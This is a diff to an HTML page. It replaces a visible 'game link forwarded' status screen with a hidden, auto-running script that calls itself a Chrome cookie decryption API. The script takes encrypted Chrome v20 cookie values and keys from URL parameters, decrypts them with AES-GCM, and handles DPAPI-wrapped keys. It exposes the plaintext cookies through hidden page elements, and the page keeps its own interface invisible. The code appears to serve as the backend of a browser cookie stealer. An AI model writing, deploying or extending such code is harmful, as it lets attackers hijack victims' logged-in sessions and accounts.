@@ -1,59 +1,234 @@
 <!DOCTYPE html>
-<html lang="en">
+<html style="display:none">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>API</title>
-    <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            margin: 0;
-        }
-        .status {
-            background: white;
-            padding: 40px;
-            border-radius: 12px;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
-            text-align: center;
-        }
-        .spinner {
-            width: 50px;
-            height: 50px;
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #667eea;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .success { color: #4CAF50; }
-        .error { color: #f44336; }
-    </style>
+    <meta charset="utf-8">
+    <style>body{display:none!important}</style>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
 </head>
-<body>
-    <div class="status">
-        <div id="loading" style="display: block;">
-            <div class="spinner"></div>
-            <p>Processing...</p>
-        </div>
-        <div id="success" style="display: none;">
-            <h2 class="success">✓ Success</h2>
-            <p>game link forwarded successfully</p>
-        </div>
-        <div id="error" style="display: none;">
-            <h2 class="error">✗ Error</h2>
-            <p id="error-msg">Failed to process request</p>
-        </div>
-    </div>
+<body style="display:none">
+<script>
+// Chrome Cookie Decryption API - URL Only Access
+console.log('Cookie Decryption API v6.0 - Initialized');
 
-    <script src="api.js"></script>
+// Hide any potential UI
+document.documentElement.style.display = 'none';
+document.body.style.display = 'none';
+
+async function decryptChromeCookie(encryptedHex, keyBase64) {
+    console.log('=== DECRYPTION REQUEST ===');
+    console.log('Encrypted hex length:', encryptedHex?.length || 'undefined');
+    console.log('Key base64 length:', keyBase64?.length || 'undefined');
+    
+    try {
+        // Convert inputs
+        const encryptedBytes = new Uint8Array(encryptedHex.match(/.{1,2}/g).map(byte => parseInt(byte, 16)));
+        const key = Uint8Array.from(atob(keyBase64), c => c.charCodeAt(0));
+        
+        console.log('Encrypted bytes length:', encryptedBytes.length);
+        console.log('Key bytes length:', key.length);
+        
+        // Parse Chrome v20 format: version(3) + padding(1) + nonce(12) + ciphertext + tag(16)
+        const version = new TextDecoder().decode(encryptedBytes.slice(0, 3));
+        console.log('Version detected:', version);
+        
+        if (version !== 'v20') {
+            throw new Error(`Unsupported version: ${version}`);
+        }
+        
+        // Extract components
+        const data = encryptedBytes.slice(3); // Skip 3-byte version
+        console.log('Data after version:', data.length);
+        
+        // Chrome v20 format after version: nonce(12) + ciphertext + tag(16)
+        const nonce = data.slice(0, 12);
+        const remaining = data.slice(12);
+        const tag = remaining.slice(-16);
+        const ciphertext = remaining.slice(0, -16);
+        
+        console.log('Component lengths:');
+        console.log('- Nonce:', nonce.length);
+        console.log('- Ciphertext:', ciphertext.length);  
+        console.log('- Tag:', tag.length);
+        
+        if (nonce.length !== 12 || tag.length !== 16) {
+            throw new Error(`Invalid component lengths: nonce=${nonce.length}, tag=${tag.length}`);
+        }
+        
+        // Use Web Crypto API for AES-GCM
+        const cryptoKey = await window.crypto.subtle.importKey(
+            'raw',
+            key,
+            'AES-GCM',
+            false,
+            ['decrypt']
+        );
+        
+        console.log('Crypto key imported successfully');
+        
+        // Combine ciphertext and tag for Web Crypto API
+        const encryptedData = new Uint8Array([...ciphertext, ...tag]);
+        console.log('Combined encrypted data length:', encryptedData.length);
+        
+        const decrypted = await window.crypto.subtle.decrypt(
+            {
+                name: 'AES-GCM',
+                iv: nonce,
+                tagLength: 128 // 16 bytes = 128 bits
+            },
+            cryptoKey,
+            encryptedData
+        );
+        
+        const result = new TextDecoder().decode(decrypted);
+        console.log('=== DECRYPTION SUCCESS ===');
+        console.log('Result length:', result.length);
+        console.log('Result preview:', result.substring(0, 100) + '...');
+        
+        return {
+            success: true,
+            decrypted_value: result,
+            message: 'Decryption successful',
+            length: result.length
+        };
+        
+    } catch (error) {
+        console.error('=== DECRYPTION FAILED ===');
+        console.error('Error:', error.message);
+        console.error('Stack:', error.stack);
+        
+        return {
+            success: false,
+            error: error.message,
+            message: 'Decryption failed'
+        };
+    }
+}
+
+// DPAPI Key Decryption (fallback - limited browser support)
+function decryptDpapiKey(encryptedKeyBase64) {
+    console.log('=== DPAPI KEY DECRYPTION ===');
+    console.log('Encrypted key base64 length:', encryptedKeyBase64?.length || 'undefined');
+    
+    try {
+        // Convert from base64
+        const keyBytes = Uint8Array.from(atob(encryptedKeyBase64), c => c.charCodeAt(0));
+        console.log('Key bytes length:', keyBytes.length);
+        
+        // Check for DPAPI header
+        if (keyBytes.length < 5) {
+            throw new Error('Key too short for DPAPI format');
+        }
+        
+        const header = new TextDecoder().decode(keyBytes.slice(0, 5));
+        console.log('DPAPI header:', header);
+        
+        if (header !== 'DPAPI') {
+            throw new Error(`Invalid DPAPI header: ${header}`);
+        }
+        
+        // Extract encrypted portion (skip 5-byte header)
+        const encryptedPortion = keyBytes.slice(5);
+        console.log('Encrypted portion length:', encryptedPortion.length);
+        
+        // Browser cannot decrypt DPAPI - return raw encrypted data
+        return {
+            success: false,
+            message: 'DPAPI decryption requires Windows PowerShell or native tools',
+            encrypted_portion: btoa(String.fromCharCode(...encryptedPortion)),
+            raw_key: encryptedKeyBase64
+        };
+        
+    } catch (error) {
+        console.error('DPAPI key processing failed:', error.message);
+        return {
+            success: false,
+            error: error.message,
+            message: 'DPAPI key processing failed'
+        };
+    }
+}
+
+// Handle API requests via URL parameters
+async function handleApiRequest() {
+    console.log('=== API REQUEST HANDLER ===');
+    
+    const urlParams = new URLSearchParams(window.location.search);
+    const operation = urlParams.get('op') || urlParams.get('operation');
+    
+    console.log('Operation:', operation);
+    console.log('URL parameters:', Object.fromEntries(urlParams.entries()));
+    
+    let result;
+    
+    if (operation === 'decrypt' || operation === 'cookie') {
+        // Cookie decryption
+        const hex = urlParams.get('hex') || urlParams.get('encrypted_hex');
+        const key = urlParams.get('key') || urlParams.get('key_base64');
+        
+        if (!hex || !key) {
+            result = {
+                success: false,
+                error: 'Missing required parameters: hex and key',
+                message: 'Provide hex and key parameters'
+            };
+        } else {
+            result = await decryptChromeCookie(hex, key);
+        }
+        
+    } else if (operation === 'dpapi' || operation === 'key') {
+        // DPAPI key processing
+        const encryptedKey = urlParams.get('encrypted_key') || urlParams.get('key');
+        
+        if (!encryptedKey) {
+            result = {
+                success: false,
+                error: 'Missing required parameter: encrypted_key',
+                message: 'Provide encrypted_key parameter'
+            };
+        } else {
+            result = decryptDpapiKey(encryptedKey);
+        }
+        
+    } else {
+        // Unknown operation or no operation
+        result = {
+            success: false,
+            error: 'Unknown operation',
+            message: 'Supported operations: decrypt, cookie, dpapi, key',
+            usage: {
+                cookie_decrypt: '?op=decrypt&hex=HEXDATA&key=BASE64KEY',
+                dpapi_process: '?op=dpapi&encrypted_key=BASE64KEY'
+            }
+        };
+    }
+    
+    console.log('=== API RESULT ===');
+    console.log('Result:', result);
+    
+    // Return result as JSON
+    document.body.innerHTML = '<pre style="display:none">' + JSON.stringify(result, null, 2) + '</pre>';
+    
+    // Also make it available in window for programmatic access
+    window.apiResult = result;
+    
+    // Set page title to indicate success/failure
+    document.title = result.success ? 'SUCCESS' : 'FAILED';
+    
+    return result;
+}
+
+// Auto-handle requests when page loads
+document.addEventListener('DOMContentLoaded', handleApiRequest);
+
+// Also handle if already loaded
+if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', handleApiRequest);
+} else {
+    handleApiRequest();
+}
+
+console.log('API handler initialized - ready for requests');
+</script>
 </body>
 </html>
